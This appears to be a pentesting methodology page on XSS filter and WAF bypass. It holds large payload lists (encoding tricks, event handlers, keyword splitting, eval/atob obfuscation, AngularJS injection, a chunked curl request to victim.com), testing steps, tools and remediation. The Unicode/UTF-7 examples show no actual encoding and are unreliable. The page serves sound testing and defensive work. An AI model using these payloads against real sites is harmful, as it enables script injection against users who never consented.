# XSS Filter / WAF Bypass

## Overview
Many applications implement client-side or server-side XSS filters, and web application firewalls (WAFs) attempt to block known XSS patterns. However, the richness and ambiguity of HTML parsing means that browsers interpret far more constructs as executable JavaScript than simple pattern-matching rules can anticipate. XSS filter bypass is the practice of finding inputs that execute JavaScript in the browser but evade the application's or WAF's detection logic through encoding, context manipulation, alternative syntax, browser quirks, or mutation.

## How It Works
Filters typically look for known dangerous patterns: `<script>`, `javascript:`, `onerror=`, `onload=`, etc. Bypass techniques exploit the gap between what the filter recognizes as dangerous and what the browser actually executes. This includes using HTML entity encoding that the browser decodes before execution, alternate casing (browsers are case-insensitive for HTML), Unicode normalization, unusual whitespace or separator characters accepted by the browser parser, less-known HTML elements and event handlers, and breaking up tokens that the filter recognizes as a single unit. WAF bypasses additionally exploit HTTP-level quirks: chunked encoding, unusual Content-Type, parameter pollution, and request fragmentation.

## Impact
- Complete bypass of security controls allowing all XSS impact classes
- Proof that a defense-in-depth approach (not just filtering) is needed
- Confidence that WAF is not a substitute for secure coding

## Where to Look
- Any input that passed a naive XSS filter and is reflected in a response
- Parameters where `<script>alert(1)</script>` is blocked but output is still reflected
- WAF-protected applications where certain payloads return 403 but others pass through
- Applications with custom regex-based filters
- Rich-text editors with HTML sanitizers
- Mobile API backends that do server-side filtering

## Testing Steps
1. Confirm the baseline — submit `<script>alert(1)</script>` and note if it is blocked or sanitized.
2. Determine where the reflection occurs (body, attribute, script block, CSS, URL context).
3. Try each bypass category systematically: case variation, encoding, alternative tags, event handlers, whitespace.
4. Use an automated XSS fuzzer (Dalfox, XSStrike) to rapidly iterate bypass payloads.
5. Examine what transformation the filter applies to your input (does it strip, encode, or block the request?).
6. If the filter strips `<script>`, try nested tags: `<scr<script>ipt>` — stripping the inner one leaves the outer intact.
7. For WAF bypasses, vary the HTTP request: chunked encoding, different Content-Type, HTTP/2, extra whitespace in parameters.
8. Confirm bypass leads to actual execution in the target browser.

## Payloads / Techniques

### Case and Whitespace Variation
```html
<ScRiPt>alert(1)</sCrIpT>
<SCRIPT>alert(1)</SCRIPT>
<script   >alert(1)</script>
<script
>alert(1)</script>
```

### Alternative Tags and Event Handlers
```html
<img src=x onerror=alert(1)>
<img src=x onerror=alert(1) />
<img/src=x onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<link rel=import href="data:text/html,<script>alert(1)</script>">
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
<math><maction actiontype="statusline#" xlink:href="javascript:alert(1)">CLICKME</maction></math>
<table background="javascript:alert(1)">
<base href="javascript:alert(1);//">
<form action="javascript:alert(1)"><input type=submit>
```

### HTML Entity Encoding Bypasses
```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
<a href="javascript:&#97;lert(1)">click</a>
```

### URL Encoding
```
%3Cscript%3Ealert(1)%3C%2Fscript%3E
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

### Double URL Encoding (when server decodes once before filter sees it)
```
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

### Unicode / UTF-7 / UTF-16 Encoding
```html
<script>alert(1)</script>
<script>alert(1)</script>
```

### Breaking Up Keywords (filter strips `script` literally)
```html
<scr\x00ipt>alert(1)</scr\x00ipt>
<scr ipt>alert(1)</scr ipt>
<scr%09ipt>alert(1)</scr%09ipt>
<scr<script>ipt>alert(1)</script>
```

### Null Bytes (may be ignored by browser parser)
```html
<scr\x00ipt>alert(1)</script>
<%00script>alert(1)</%00script>
```

### Alternate JavaScript Execution Without Parentheses
```javascript
alert`1`
alert`${1}`
[1].map(alert)
onerror=alert;throw 1
```

### Without Equal Sign
```html
<svg onload ="alert(1)">
<img src="x" onerror ="alert(1)">
```

### Event Handler Without Quotes
```html
<img src=x onerror=alert(1)>
<img src=x onerror=alert`1`>
```

### CSS Expression (IE legacy)
```html
<style>body{background-image:url("javascript:alert(1)")}</style>
<div style="background-image:url(javascript:alert(1))">
<div style="width:expression(alert(1))">
```

### Obfuscation with JavaScript
```javascript
// String splitting
[].constructor.constructor('al'+'ert(1)')()
// Eval with encoded string
eval(atob('YWxlcnQoMSk='))
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
// Via constructor
({})['\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72']['\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72']('\x61\x6c\x65\x72\x74\x28\x31\x29')()
```

### Template Literal Bypass
```javascript
alert`1`
setTimeout`alert\x281\x29`
```

### Filter Stripping Creates New Payload (recursive)
If the filter removes `<script>` from `<scrscriptipt>`:
```
<scrscriptipt>alert(1)</scrscriptipt>
<scr<script>ipt>alert(1)</scr</script>ipt>
```

### Attribute Separator Bypass
```html
<img src=x%09onerror=alert(1)>       <!-- tab -->
<img src=x%0aonerror=alert(1)>       <!-- newline -->
<img src=x%0donerror=alert(1)>       <!-- carriage return -->
<img src=x%0conerror=alert(1)>       <!-- form feed -->
```

### WAF Bypass via HTTP-Level Tricks
```bash
# Chunked encoding
curl -v --chunked -X POST https://victim.com/search \
     --data-raw $'Transfer-Encoding: chunked\r\n\r\n5\r\nquery\r\n1e\r\n=<script>alert(1)</script>\r\n0\r\n\r\n'

# Parameter pollution
GET /search?q=benign&q=<script>alert(1)</script>

# Content-Type mismatch
POST /api/search
Content-Type: application/x-www-form-urlencoded

{"query":"<script>alert(1)</script>"}
```

### AngularJS Template Injection (CSP bypass in AngularJS apps)
```
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
{{[].pop.constructor('alert(1)')()}}
```

### Data URI XSS
```html
<iframe src="data:text/html,<script>alert(1)</script>">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

## Burp Suite Tips
- Use **Hackvertor** (Burp extension) to apply multiple encoding transformations to payloads automatically — wrap your payload in encoding functions like `<@urlencode>` or `<@html_encode>`.
- Use **Burp Intruder** with the **Sniper** mode and a comprehensive XSS bypass wordlist (SecLists `XSS-Jhaddix.txt`).
- Inspect what transformation the filter applies in **Burp Repeater** by submitting the payload and examining the raw response for partial matches.
- Enable **Burp's Active Scanner** with XSS detection — it uses many bypass variations automatically.
- Use the **Active Scan++** extension for additional scan insertion points and bypass logic.
- The **Autowasp** or **403 Bypass** extensions can automate WAF bypass HTTP-level tricks.
- Add a **Match rule** in Repeater to highlight when any variation of your payload appears unescaped in the response.

## Tools
- XSStrike — https://github.com/s0md3v/XSStrike (built-in bypass intelligence)
- Dalfox — https://github.com/hahwul/dalfox (fast XSS scanner with bypass payloads)
- Hackvertor (Burp extension) — multi-layer encoding
- XSS Cheat Sheet — https://portswigger.net/research/xss-cheat-sheet
- SecLists XSS payloads — https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS
- 0xsobky's XSS polyglot — https://github.com/0xsobky/HackVault
- WAFNinja — https://github.com/khalilbijjou/WAFNinja

## Remediation
- **Never rely solely on filters or WAFs**: Filters are bypassed; use parameterized output — encode at render time.
- **Encode at context**: Use the correct encoding function for each context (HTML, JS, CSS, URL). A WAF cannot do this correctly — only the application developer who knows the context can.
- **Use Content Security Policy**: A properly configured CSP makes XSS non-executable even if a bypass exists.
- **DOMPurify with allowlist**: If HTML input is required, use DOMPurify with a strict allowlist of tags and attributes.
- **WAF as defense-in-depth**: Use a WAF as a secondary layer only — it should never be the primary XSS defense.

## References
https://portswigger.net/research/xss-cheat-sheet
https://owasp.org/www-community/xss-filter-evasion-cheatsheet
https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
https://portswigger.net/web-security/cross-site-scripting/contexts
